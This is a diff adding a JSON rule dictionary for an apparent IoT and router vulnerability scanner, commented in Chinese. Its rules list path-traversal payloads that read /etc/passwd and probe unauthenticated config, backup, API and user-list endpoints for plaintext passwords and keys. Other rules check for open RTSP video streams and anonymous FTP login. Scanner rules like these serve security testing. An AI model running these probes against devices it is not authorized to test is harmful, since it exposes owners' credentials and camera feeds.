@@ -1,0 +1,77 @@
+{
+  "_comment": "通用未授权端点字典 (2026-08-22)。新产品线无专属字典时起步用; 命中后按设备页面再挖专属端点。判据: HTTP 双差分+字段验证(脚本内建)。",
+  "rules": [
+    {
+      "id": "conf-read",
+      "name": "配置文件/备份未授权读取(含口令)",
+      "type": "http", "severity": "high", "method": "GET",
+      "paths": ["/config.bin", "/config.json", "/backup.conf", "/device.conf", "/system.ini",
+                "/webconfig", "/config.xml", "/backup/", "/export/config",
+                "/download/config.tar.gz", "/cgi-bin/DownloadCfg/RouterCfm.cfg"],
+      "match_any": ["password", "passwd", "wifi_key", "secret", "adminpass"],
+      "exclude_any": ["login", "unauthorized", "401", "404", "forbidden",
+                      "javascript", "function(", "<html", "<!doctype", "login.html"],
+      "fake_hints": ["example", "localhost", "placeholder", "your_", "xxxx"],
+      "min_len": 200,
+      "note": "响应含真实口令/密钥明文 → 未授权读敏感配置, 高危"
+    },
+    {
+      "id": "passwd-traversal",
+      "name": "路径穿越读系统文件",
+      "type": "http", "severity": "high", "method": "GET",
+      "paths": ["/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "/../../../../etc/passwd",
+                "/cgi-bin/../../../../etc/passwd", "/download?file=../../../../etc/passwd"],
+      "match_any": ["root:"],
+      "exclude_any": ["login", "404", "not found"],
+      "fake_hints": [],
+      "min_len": 10,
+      "note": "响应含 root: 行 → 任意文件读取, 高危"
+    },
+    {
+      "id": "api-sensitive",
+      "name": "API未授权返回敏感信息",
+      "type": "http", "severity": "mid", "method": "GET",
+      "paths": ["/api/v1/system/info", "/api/device/info", "/api/system/status",
+                "/cgi-bin/status.cgi", "/api/v1/device", "/status.json"],
+      "match_any": ["password", "passwd", "token", "secret", "key", "ssid"],
+      "exclude_any": ["login", "unauthorized", "401"],
+      "fake_hints": ["example", "localhost"],
+      "min_len": 30,
+      "note": "API 返回明文口令/密钥/令牌 → 中危起步, 内容更敏感可提级"
+    },
+    {
+      "id": "userlist",
+      "name": "用户列表未授权读取",
+      "type": "http", "severity": "mid", "method": "GET",
+      "paths": ["/api/users", "/api/v1/users", "/user/list", "/cgi-bin/get_user_list", "/users.json"],
+      "match_any": ["username", "user_id", "userid"],
+      "exclude_any": ["login", "unauthorized", "401", "404"],
+      "fake_hints": [],
+      "min_len": 30,
+      "note": "未授权枚举全部用户 → 中危"
+    },
+    {
+      "id": "backup-open",
+      "name": "备份/导出目录可访问",
+      "type": "http", "severity": "mid", "method": "GET",
+      "paths": ["/backup/", "/export/", "/download/", "/files/", "/log/"],
+      "match_any": [],
+      "exclude_any": ["login", "unauthorized", "401", "404", "403"],
+      "fake_hints": [],
+      "min_len": 100,
+      "note": "目录列表/文件可下 → needs_review 人工裁决(含配置=高危)"
+    },
+    {
+      "id": "rtsp-unauth",
+      "name": "RTSP 视频流未授权观看",
+      "type": "rtsp", "severity": "high", "port": 554,
+      "note": "DESCRIBE 200 且 SDP 含 v=0+m=video/audio = 无认证可拉流, 高危(v2 严格判据)"
+    },
+    {
+      "id": "ftp-anon",
+      "name": "FTP 匿名登录",
+      "type": "ftp", "severity": "mid", "port": 21,
+      "note": "anonymous 230 → 按目录内容定级: 含配置/固件=高危; 空目录=降级记录"
+    }
+  ]
+}
